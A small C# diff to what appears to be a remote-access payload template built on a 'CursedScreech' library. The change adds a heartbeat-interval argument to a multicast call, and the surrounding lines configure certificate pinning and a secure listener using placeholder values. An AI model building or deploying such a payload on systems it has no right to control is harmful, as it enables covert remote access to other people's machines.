@@ -11,7 +11,7 @@ namespace Payload
             InitializeComponent();
             
 			CursedScreech.CursedScreech cs = new CursedScreech.CursedScreech();
-            cs.startMulticaster("IPAddress", mcastport);
+            cs.startMulticaster("IPAddress", mcastport, hbinterval);
             cs.setRemoteCertificateSerial("serial");
             cs.setRemoteCertificateHash("fingerprint");
             cs.startSecureServerThread("privateKey", "password");
